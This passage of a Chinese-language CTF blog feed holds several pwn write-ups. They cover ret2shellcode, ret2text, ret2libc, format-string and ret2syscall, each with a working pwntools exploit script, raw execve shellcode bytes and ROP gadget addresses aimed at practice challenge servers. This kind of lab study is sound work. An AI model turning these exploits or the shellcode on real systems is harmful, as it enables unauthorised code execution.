<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>é€šè¿‡vmmapæˆ‘ä»¬å¯ä»¥æŸ¥çœ‹bssæ®µæ˜¯å¦å…·æœ‰å¯æ‰§è¡Œæƒé™<br><img data-src="https://pic1.zhimg.com/80/v2-3cac07ac2fda33db599f641decbd4a20_1440w.webp"><br>rw-pï¼Œå¯è¯»å¯å†™<br>ï¼ˆè¿™é‡Œæ“ä½œä¸Šè¦æ³¨æ„ä¸€ä¸‹ï¼Œvmmapçš„å‘½ä»¤è¦åœ¨ç¨‹åºè¿è¡Œæ—¶ä½¿ç”¨ï¼Œå¯ä»¥ç»™ç¨‹åºä¸‹æ–­ç‚¹æˆ–è€…ctrl+Cåœä½ç¨‹åºå†è¾“å‘½ä»¤ï¼‰</p>
<p><a href="https://ch4r1l3.github.io/2018/06/22/pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E7%AC%AC%E4%B8%89%E7%AB%A0%E2%80%94%E2%80%94gdb%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/">å‚è€ƒèµ„æ–™</a></p>
<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>æœ‰æ‰§è¡Œæƒé™çš„è¯å°±å¯ä»¥å‘bssæ®µå†™å…¥shellcodeäº†ï¼Œä¹‹åæ§åˆ¶ç¨‹åºè¿”å›æ‰§è¡Œshellcode<br>åœ¨å†™expä¹‹å‰è¿˜è¦å…ˆè®¡ç®—åç§»é‡ï¼Œæ–¹æ³•å’Œret2textç±»ä¼¼ï¼Œä¸ä¹‹å‰çš„åç§»é‡éƒ½æ˜¯ä¸€æ ·çš„<br>ç”¨gdbè°ƒè¯•æˆ–è€…çˆ†ç ´æ±‚å‡ºåç§»é‡ä¸º112<br>ä½¿ç”¨shellcraft.sh()ç”Ÿæˆshellcodeï¼Œå¹¶ä¸”ç”¨shellcode.ljust()æ–¹æ³•å‘å·¦å¯¹é½è¡¥é½å­—ç¬¦ä¸²ï¼Œæº¢å‡ºå¡«å……è¿”å›åœ°å€<br>expä¸º</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line"></span><br><span class="line">p.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">&#x27;A&#x27;</span>) + p32(buf2_addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>å¥½åƒshellcodeå†™åœ¨æ ˆæˆ–è€…bssæ®µä¸Šéƒ½å¯ä»¥å§ï¼Ÿ</p>
<p>ç½‘ä¸Šçœ‹åˆ°ä¸€ä¸ªè§£é‡Šè¯´ä¸èƒ½ç›´æ¥æŠŠshellcodeå†™åœ¨æ ˆä¸Šï¼Ÿä¸çŸ¥é“å¯¹ä¸å¯¹ï¼š<br>ç»å¤§å¤šæ•°çš„æ“ä½œç³»ç»Ÿéƒ½é»˜è®¤å¼€å¯ASLRä¿æŠ¤ï¼Œè¿™å¤§å¤§æé«˜äº†æ”»å‡»æ ˆçš„éš¾åº¦ã€‚å› æ­¤ï¼Œæ ˆåº”å½“æ˜¯æˆ‘ä»¬æœ€åè€ƒè™‘çš„å¯¹è±¡</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>ctf-wiki</tag>
      </tags>
  </entry>
  <entry>
    <title>week3 T5</title>
    <url>/posts/fe55b1cb/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T5-level2"><a href="#T5-level2" class="headerlink" title="T5 level2"></a>T5 level2</h2><blockquote>
<p>2023-01-15WP<br>æ”»é˜²ä¸–ç•Œpwné¢˜<br>è€ƒç‚¹ï¼šret2libc1<br>ï¼ˆä¸æ˜¯æˆ‘ä¸æƒ³å¾€ä¸‹åšï¼Œè€Œæ˜¯å¾€ä¸‹åšçš„è¯çœŸçš„æ˜¯è¦è¡¥å¤ªå¤šçŸ¥è¯†äº†ï¼Œæ–°çš„çŸ¥è¯†è¿˜æ²¡å­¦ä¼šï¼Œåªå¥½æ‰¾ä¸€é¢˜æ¥åˆ’ä¸€ä¸‹æ°´äº†â€¦â€¦ï¼‰</p>
</blockquote>
<span id="more"></span>

<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>fileï¼Œchecksec â€”â€” 32-bitï¼Œå¼€å¯NX</p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDAä¸€çœ‹æ²¡å•¥ï¼Œç‚¹è¿›vulnå‡½æ•°æ‰¾åˆ°ä¸€ä¸ªreadå‡½æ•°<br><img data-src="https://pic1.zhimg.com/80/v2-3f3caf9f6fe1b9fe6e5088a2e1619e2c_1440w.webp"><br><img data-src="https://pic2.zhimg.com/80/v2-3a54c2fc46d20dc1f7a6493a4fd40ba9_1440w.webp"><br>ç”±å›¾ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œbufåˆ†é…çš„ç©ºé—´ä¸º0x88,è€Œreadå‡½æ•°è¯»å–0x100ï¼Œæ˜¾ç„¶å­˜åœ¨æº¢å‡º<br>shift+f12æ‰¾åˆ°æœ‰å­—ç¬¦ä¸²&#x2F;bin&#x2F;shï¼Œå¹¶ä¸”åœ¨vulnå‡½æ•°é‡Œæœ‰systemå‡½æ•°ï¼Œåªä¸è¿‡å‚æ•°æ˜¯â€ehco Inputï¼šâ€ç½¢äº†<br>è®°ä¸‹systemå‡½æ•°çš„pltè¡¨åœ°å€0x08048320<br><img data-src="https://pic1.zhimg.com/80/v2-f2adaa287713c287b7d0b7070f687524_1440w.webp"></p>
<p>è¿™æ ·å°±åªéœ€è¦æˆ‘ä»¬è¦†ç›–bufï¼Œå°†systemå‡½æ•°åœ°å€å†™ä¸ºè¿”å›åœ°å€ï¼Œå¹¶å°†&#x2F;bin&#x2F;shä½œä¸ºå‚æ•°ä¼ é€’å…¶åœ°å€å³å¯</p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>exp</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27; 61.147.171.105 &#x27;</span>, <span class="number">60218</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(<span class="number">0x08048320</span>)+<span class="string">b&#x27;bbbb&#x27;</span> + p32(<span class="number">0x0804A024</span>)</span><br><span class="line"><span class="comment">#0x88ä¸ºbufå¤§å°ï¼Œ+4æ˜¯ebpå¤§å°ï¼Œp32(0x08048320)æ˜¯æ‰“åŒ…systemåœ°å€ï¼Œb&#x27;bbbb&#x27;æ˜¯å¡«å……æ— æ•ˆsystemè¿”å›åœ°å€ï¼Œ </span></span><br><span class="line"><span class="comment">#p32(0x0804A024)æ˜¯/bin/shåœ°å€</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>æ”»é˜²ä¸–ç•Œ</tag>
      </tags>
  </entry>
  <entry>
    <title>week4&amp;&amp;week5-T3</title>
    <url>/posts/7c502166/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T3-ç¬¬äº”ç©ºé—´2019-å†³èµ›-PWN5"><a href="#T3-ç¬¬äº”ç©ºé—´2019-å†³èµ›-PWN5" class="headerlink" title="T3 [ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5"></a>T3 [ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5</h2><blockquote>
<p>2023-01-27WP<br>BUUCTF pwnç¬¬ä¸ƒé¢˜<br>è€ƒç‚¹ï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p>
</blockquote>
<span id="more"></span>

<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file &amp;&amp; checksec â€”â€” 32 bit , å¼€å¯NXï¼Œå¼€å¯cannary</p>
<p><img data-src="https://pic3.zhimg.com/80/v2-9e3862844f2bd9655cfffdff011bd7da_1440w.webp"></p>
<p>è¿™å°±æ²¡æ³•æ ˆæº¢å‡ºäº†<br>è¿è¡Œç¨‹åºçœ‹çœ‹è¾“å‡º</p>
<p><img data-src="https://pic4.zhimg.com/80/v2-28662f39bf58b3e1ecc77bfbb48c1fab_1440w.webp"></p>
<p>0x02</p>
<p>IDAæŸ¥çœ‹ä»£ç </p>
<p><img data-src="https://pic2.zhimg.com/80/v2-33b5a588a4426ffce92591baff62ae05_1440w.webp"></p>
<p>å…ˆæ‰¾string window å‘ç°&#x2F;bin&#x2F;shï¼Œè¿›ä¸€æ­¥æŸ¥çœ‹å‘ç°ç¨‹åºå°±æ˜¯å…ˆè¯»å–ç”¨æˆ·åï¼Œå†è¯»å…¥å¯†ç ï¼Œç„¶åå†å°†ç”¨æˆ·è¾“å…¥çš„å¯†ç å’Œç”Ÿæˆçš„ä¸€ä¸ªéšæœºå¯†ç æ¯”è¾ƒï¼Œæ­£ç¡®åˆ™æ‰§è¡Œsystem(&#x2F;bin&#x2F;sh)ï¼Œé”™è¯¯åˆ™è¾“å‡ºfail</p>
<p>è§‚å¯Ÿå‘ç°printf(&amp;buf);å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p>
<p>ï¼ˆå…³äºæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„ç›¸å…³çŸ¥è¯†ä¼šå¦å†™ä¸€ç¯‡ï¼‰</p>
<p>0x03</p>
<p>ç°åœ¨å¯ä»¥åˆ©ç”¨%næ¥ä¿®æ”¹å‚æ•°é‡Œçš„å†…å®¹ï¼Œæˆ‘ä»¬ä¸çŸ¥é“è¯»å…¥çš„éšæœºæ•°æ˜¯å¤šå°‘ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°†å®ƒæ”¹æˆæˆ‘ä»¬å†™å…¥çš„æ•°æ®å°±å¥½äº† </p>
<p>é¦–å…ˆåˆ©ç”¨æµ‹è¯•æ•°æ®â€AAAA %08x %08x %08x %08x %08x %08x %08xâ€¦â€¦â€¦â€¦ â€œæ¥ç¡®å®šåç§»é‡ï¼Œ</p>
<p><img data-src="https://pic4.zhimg.com/80/v2-13630a4e96f63372c3c048636423b0eb_1440w.webp"></p>
<p>å‘ç°è¾“å…¥çš„æ•°æ®æ˜¯æ ˆçš„ç¬¬åä¸ª</p>
<p>å¹¶ä¸”å­˜æ”¾ç”Ÿæˆçš„éšæœºå¯†ç çš„åœ°å€æ˜¯ä»0x0804C044å¼€å§‹çš„ï¼Œå…±å››å­—èŠ‚ç©ºé—´</p>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨%10$,%11$,%12$,%13$å»å®šä½åˆ°è¿™4ä¸ªåœ°å€ï¼Œå†ç”¨%nä¿®æ”¹è¿™äº›åœ°å€é‡Œçš„å†…å®¹ </p>
<p><img data-src="https://pic2.zhimg.com/80/v2-4c6e49700dcdd067c211a07e233208e9_1440w.webp"></p>
<p>å¯ä»¥æ„é€ payloadäº†</p>
<p>0x04</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">    </span><br><span class="line">p=remote(&#x27;node4.buuoj.cn&#x27;,28332)</span><br><span class="line">    </span><br><span class="line">addr = 0x804c044</span><br><span class="line">    </span><br><span class="line">payload=p32(addr)+p32(addr+1)+p32(addr+2)+p32(addr+3)</span><br><span class="line">payload+=b&#x27;%10$n%11$n%12$n%13$n&#x27;</span><br><span class="line">    </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(str(0x10101010))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºæ€»å…±è¾“å…¥äº†å››ä¸ªåœ°å€ï¼Œå…±16ä½ï¼Œæ‰€ä»¥%næ‰€èµ‹å€¼çš„æ•°æ˜¯16ï¼Œæ‰€ä»¥ç”¨æˆ·è¾“å…¥å¯†ç æ—¶å‘é€çš„æ•°æ®ä¸º0x10101010</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf BUUCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>week4 T1</title>
    <url>/posts/64ef4d6b/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="Week4-amp-amp-Week5-T1-jarvisoj-level0"><a href="#Week4-amp-amp-Week5-T1-jarvisoj-level0" class="headerlink" title="Week4&amp;&amp;Week5 T1  jarvisoj_level0"></a>Week4&amp;&amp;Week5 T1  jarvisoj_level0</h2><p>2023-01-20WP<br>BUUCTF pwn ç¬¬å…­é¢˜<br>è€ƒç‚¹ï¼š ç®€å•æ ˆæº¢å‡º&#x2F;åŸºæœ¬rop ret2text</p>
<span id="more"></span>

<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file checksec â€”â€” 64-bitï¼Œå¼€NX</p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDAæŸ¥çœ‹å‘ç°mainå‡½æ•°é‡Œçš„vulnerable_function()å‡½æ•°é‡Œçš„readå‡½æ•°è¯»å–0x200ullï¼Œè€Œbufç©ºé—´åªæœ‰0x80<br>åˆæ‰¾åˆ°æœ‰system(â€œ&#x2F;bin&#x2F;shâ€)<br>è¿”å›å…¶åœ°å€</p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p><strong>exp</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&quot;node4.buuoj.cn&quot;,29175)</span><br><span class="line">ret_arr = 0X40059A</span><br><span class="line">payload = b&#x27;a&#x27;*(0x80 + 0x8) + p64(ret_arr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf BUUCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>week3 T4</title>
    <url>/posts/8952815d/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T4-ret2shellcode-2-æ ˆå†™å…¥"><a href="#T4-ret2shellcode-2-æ ˆå†™å…¥" class="headerlink" title="T4 ret2shellcode 2 (æ ˆå†™å…¥)"></a>T4 ret2shellcode 2 (æ ˆå†™å…¥)</h2><blockquote>
<p>2023-01-15WP<br>sniperoj-pwn100-shellcode<br>è€ƒç‚¹ï¼šæ ˆæº¢å‡º shellcode</p>
</blockquote>
<span id="more"></span>

<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file ,checksecæ£€æŸ¥ä¿æŠ¤æœºåˆ¶<br><img data-src="https://pic2.zhimg.com/80/v2-93af3c284b45a8b1bc9b8d234218d6b9_1440w.webp"><br>å¼€å¯äº†PIE  åœ°å€å˜æ¢</p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDAä¸­çœ‹çœ‹æºç <br><img data-src="https://pic1.zhimg.com/80/v2-1dda406b44f40e076971774458e5d654_1440w.webp"><br>å‘ç°å·²ç»æœ‰è¾“å‡ºäº†bufçš„åœ°å€ï¼Œå› æ­¤éšæœºåŒ–åœ°å€ä¾¿å¯ä»¥è¿›è¡Œç»•è¿‡<br>ç»§ç»­åˆ†æå‘ç°readå‡½æ•°è¯»å…¥0x40å­—èŠ‚ï¼Œè€Œbufåˆ†é…çš„ç©ºé—´æ‰0x10å­—èŠ‚ï¼Œå­˜åœ¨æ ˆæº¢å‡º<br>æ‰“å¼€string windowï¼Œæ²¡æœ‰systemå’Œ&#x2F;bin&#x2F;shï¼Œåº”è¯¥æ˜¯è¦å†™å…¥shellcodeäº†</p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>å…ˆçœ‹çœ‹æˆ‘ä»¬çš„ç©ºé—´èƒ½ä¸èƒ½å†™ä¸‹shellcodeè¿™é‡Œmainå‡½æ•°é‡Œå£°æ˜çš„bufåªæœ‰0x10å³16å­—èŠ‚ï¼Œå±äºå±€éƒ¨å˜é‡ï¼Œç©ºé—´åˆ†é…åœ¨æ ˆä¸Š<br>gdbåŠ¨æ€è°ƒè¯•ï¼Œï¼ˆå…¶å®IDAèƒ½çœ‹å‡ºæ¥ï¼Œå°±æ˜¯ä¸ç¡®å®šå¯¹ä¸å¯¹å°±æ˜¯äº†ï¼‰<br><img data-src="https://img-blog.csdnimg.cn/img_convert/3bcd85545cf60cac9b4aefb0eee24d1b.png"><br>æˆ‘ä»¬è®¡ç®—bufçš„åç§»é‡ä¸ºrbp - rsp  &#x3D; 0x7fffde3d2820 - 0x7fffde3d2810 &#x3D; 10ï¼Œå†åŠ ä¸Šrbp 8å­—èŠ‚ä¸º0x18å³24å­—èŠ‚</p>
<p>è€Œæˆ‘ä»¬ç”¨shellcraftç”Ÿæˆçš„shellcodeæ—¶44å­—èŠ‚çš„ï¼Œæ˜¾ç„¶å·²ç»è¶…è¿‡äº†<br>äºæ˜¯æˆ‘ä»¬æƒ³æ‰¾ä¸€ä¸ªé•¿åº¦è¾ƒå°çš„shellcodeæ¥å†™å…¥ï¼Œä½†æ˜¯ç”±äºæŸäº›æˆ‘è¿˜æ²¡æå¾ˆæ‡‚çš„åŸå› ï¼Œæˆ‘ä»¬å¿…é¡»è¦å°†æŠŠshellcodeæ”¾åœ¨è¿”å›<br>åœ°å€çš„åé¢<br>é‚£æ”¾åœ¨åé¢çš„è¯æ˜¯ä¸æ˜¯44å­—èŠ‚çš„shellcodeå°±å¯ä»¥ä½¿ç”¨äº†å‘¢ï¼Ÿå…¶å®ä¹Ÿä¸è¡Œï¼Œè¦æ³¨æ„åˆ°readå‡½æ•°æ˜¯è¯»å–0x40å­—èŠ‚çš„ï¼Œè¿™å°±ä½¿å¾—è¯»å–çš„å­—ç¬¦ä¸²é•¿åº¦æœ‰ä¸€å®šçš„é™åˆ¶ã€‚è¿™0x40å­—èŠ‚çš„æ•°æ®ï¼Œæ—¢è¦åŒ…æ‹¬å¡«å……çš„åƒåœ¾æ•°æ®ï¼Œä¹Ÿè¦åŒ…æ‹¬shellcodeçš„è¿”å›åœ°å€å’Œshellcodeçš„å†…å®¹ï¼Œæˆ‘ä»¬è¿˜å¾—è®¡ç®—ä¸€ä¸‹å…è®¸çš„shellcodeçš„é•¿åº¦<br>0x40 - ( 0x10 + 8 ) - 8 &#x3D; 32<br>ï¼ˆ0x10+8ï¼‰ä¸ºé€ æˆæº¢å‡ºå¡«å……çš„åƒåœ¾æ•°æ®ï¼Œåé¢8ä¸ºæ˜¯shellcodeåœ°å€çš„é•¿åº¦ï¼Œæ‰€ä»¥æ„å»ºçš„shllcodeå¿…é¡»åœ¨32ä»¥å†…<br>ä¹‹å‰ä½¿ç”¨çš„shellcraft.sh()ç”Ÿæˆçš„shellcodeæœ‰44å­—èŠ‚ï¼Œåœ¨è¿™é‡Œåªæœ‰32å­—èŠ‚ï¼Œå› æ­¤å¹¶ä¸é€‚ç”¨</p>
<blockquote>
<p>shellcode&#x3D;â€\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05â€</p>
</blockquote>
<p>ä¸€ä¸ªæ‰¾shellcodeçš„ç½‘ç«™</p>
<blockquote>
<p><a href="https://www.exploit-db.com/shellcodes">https://www.exploit-db.com/shellcodes</a><br><a href="http://shell-storm.org/shellcode/">http://shell-storm.org/shellcode/</a> </p>
</blockquote>
<p>è¿™ä¸ªshellcodeåªæœ‰23ä¸ªå­—èŠ‚ï¼ŒçŸ­å°ç²¾æ‚ï¼Œé€‚åˆæ”¾åœ¨æ ˆä¸­å»æ‰§è¡Œ</p>
<p>å†™exp (å‘ç°ä¸€ä¸ªåœ°æ–¹ï¼šå°±æ˜¯æ­£å¸¸pythonä»£ç ä¸èƒ½åœ¨å¼€å¤´ç•™ç©ºæ ¼)</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">addr = p.recvuntil(<span class="string">&#x27;]&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Now give me your answer&#x27;</span>)</span><br><span class="line">shellcode=<span class="string">&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span> + p64(<span class="built_in">int</span>(addr,<span class="number">16</span>)+<span class="number">32</span>) + shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæˆ‘ä»¬åªçŸ¥é“ä¸€ä¸ªç¡®å®šçš„bufçš„addrï¼Œshellcodeçš„åœ°å€è¦ä»bufçš„åœ°å€æ¨å‡ºæ¥ï¼Œä¹Ÿå°±æ˜¯int(addr,16)+32</p>
<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>ä¸ºä»€ä¹ˆä¸å¯ä»¥æ‰¾ä¸€ä¸ªé•¿åº¦å°äº24çš„shellcodeç›´æ¥å†™å…¥bufä¸­å‘¢ï¼Ÿè€Œéè¦å…ˆå¡«å……bufå†è¿”å›è‡³å†™shellcodeçš„åœ°æ–¹å‘¢ï¼Ÿ<br>åœ¨ç½‘ä¸Šæ‰¾åˆ°ä¸€ä¸ªè§£é‡Šä¸çŸ¥é“å¯¹ä¸å¯¹</p>
<blockquote>
<p>å› ä¸ºå…¶æœ¬èº«æ˜¯æœ‰pushæŒ‡ä»¤çš„ï¼Œå¦‚æœæˆ‘ä»¬æŠŠshellcodeæ”¾åœ¨è¿”å›åœ°å€çš„å‰é¢ï¼Œåœ¨ç¨‹åºleaveçš„æ—¶å€™ä¼šç ´åshellcodeï¼Œæ‰€ä»¥æˆ‘ä»¬å°†å…¶æ”¾åœ¨åé¢</p>
</blockquote>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>ctf-wiki</tag>
      </tags>
  </entry>
  <entry>
    <title>week4&amp;&amp;week5-T2</title>
    <url>/posts/b5711f0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T2-ret2syscall"><a href="#T2-ret2syscall" class="headerlink" title="T2 ret2syscall"></a>T2 ret2syscall</h2><blockquote>
<p>2023-01-22WP<br>ctf-wiki åŸºç¡€rop<br>è€ƒç‚¹ï¼šret2syscall</p>
</blockquote>
<p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">é¢˜ç›®é“¾æ¥</a></p>
<span id="more"></span>

<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file checksec â€”â€” 32-bit å¼€å¯NXä¿æŠ¤ï¼Œå †æ ˆä¸å¯æ‰§è¡Œ<br>è€Œä¸”æ³¨æ„è¿™æ˜¯statically linkedï¼ˆé™æ€é“¾æ¥ï¼‰ï¼Œä¸èƒ½é€šè¿‡æ³„éœ²åº“å‡½æ•°åœ°å€è·å–systemå‡½æ•°åœ°å€</p>
<p><img data-src="https://pic3.zhimg.com/80/v2-ce9f573c1ee908c7343b45691c74ce8e_1440w.webp"></p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDAçœ‹æºç ï¼Œå‘ç°æ²¡æœ‰systemå‡½æ•°å¯ç”¨<br>æœ‰getså‡½æ•°ï¼Œåº”è¯¥æ˜¯é€šè¿‡å®ƒå®ç°æ ˆæº¢å‡º</p>
<p><img data-src="https://pic1.zhimg.com/80/v2-5cc70f310e93e5c4fb3262ff9297fb44_1440w.webp"></p>
<p>ç”±0x01å¯çŸ¥æˆ‘ä»¬ä¸èƒ½ç›´æ¥åˆ©ç”¨ç¨‹åºä¸­çš„æŸä¸€æ®µä»£ç æˆ–è€…è‡ªå·±å¡«å†™ä»£ç æ¥è·å¾— shellï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨ç¨‹åºä¸­çš„ gadgets æ¥è·å¾— shellï¼Œè€Œå¯¹åº”çš„ shell è·å–åˆ™æ˜¯åˆ©ç”¨ç³»ç»Ÿè°ƒç”¨ã€‚é‡‡å–ä½¿ç”¨ret2syscallå³æ§åˆ¶ç¨‹åºæ‰§è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œè·å– shellã€‚</p>
<p>ä¹Ÿå°±æ˜¯æˆ‘ä»¬åªéœ€è¦æŠŠå„ä¸ªå‚æ•°æ”¾åœ¨å¯¹åº”çš„å¯„å­˜å™¨ä¸­ï¼Œæ‰§è¡Œint 0x80 å°±å¯å®ç°å¯¹ç³»ç»Ÿçš„è°ƒç”¨</p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>åˆ©ç”¨ç³»ç»Ÿè°ƒç”¨æ¥è·å–shell</p>
<blockquote>
<p>execve(â€œ&#x2F;bin&#x2F;shâ€,NULL,NULL)</p>
</blockquote>
<p>å…³äºç³»ç»Ÿè°ƒç”¨è¡¥å……çŸ¥è¯†è§0x05</p>
<p>æ„é€ çš„ç›®æ ‡å¦‚ä¸‹</p>
<ul>
<li>ç³»ç»Ÿè°ƒç”¨å·ï¼Œå³ eax åº”è¯¥ä¸º 0xb</li>
<li>ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå³ ebx åº”è¯¥æŒ‡å‘ &#x2F;bin&#x2F;sh çš„åœ°å€ï¼Œå…¶å®æ‰§è¡Œ sh çš„åœ°å€ä¹Ÿå¯ä»¥ã€‚</li>
<li>ç¬¬äºŒä¸ªå‚æ•°ï¼Œå³ ecx åº”è¯¥ä¸º 0</li>
<li>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå³ edx åº”è¯¥ä¸º 0</li>
</ul>
<p>æˆ‘ä»¬è¦æ‰¾åˆ°ç³»ç»Ÿè°ƒç”¨ç›¸å¯¹äºçš„å¯„å­˜å™¨çš„å€¼<br>é¦–å…ˆè¦è®©EAX &#x3D; 0xbï¼Œé‚£ä¹ˆéœ€è¦çš„æŒ‡ä»¤æ˜¯ pop eax  ï¼›ä½†æ˜¯æˆ‘ä»¬å¹¶ä¸èƒ½æœŸå¾…æœ‰ä¸€æ®µè¿ç»­çš„ä»£ç å¯ä»¥åŒæ—¶æ§åˆ¶å¯¹åº”çš„å¯„å­˜å™¨ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€æ®µä¸€æ®µæ§åˆ¶ï¼Œæ‰€ä»¥popä¹‹åè¿˜éœ€è¦ä¸€ä¸ªretè¿”å›åˆ°æ§åˆ¶ç¨‹åºæ‰§è¡Œæµï¼Œ pop eax ï¼›ret</p>
<p><img data-src="https://pic1.zhimg.com/80/v2-c204d633f5590e37cb76a002732c2e3c_1440w.webp"></p>
<p>é€‰æ‹©è¿™ä¸ªåœ°å€ï¼š</p>
<blockquote>
<p>0x080bb196 : pop eax ; ret</p>
</blockquote>
<p>åŒç†ï¼ŒæŸ¥æ‰¾æ§åˆ¶å…¶ä»–ä¸‰ä¸ªå¯„å­˜å™¨çš„gadget</p>
<p><img data-src="https://pic4.zhimg.com/80/v2-1e5731dc562a330b4797360501705ecb_1440w.webp"></p>
<p>æˆ‘ä»¬é€‰æ‹©è¿™ä¸ªåœ°å€ï¼š</p>
<blockquote>
<p>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</p>
</blockquote>
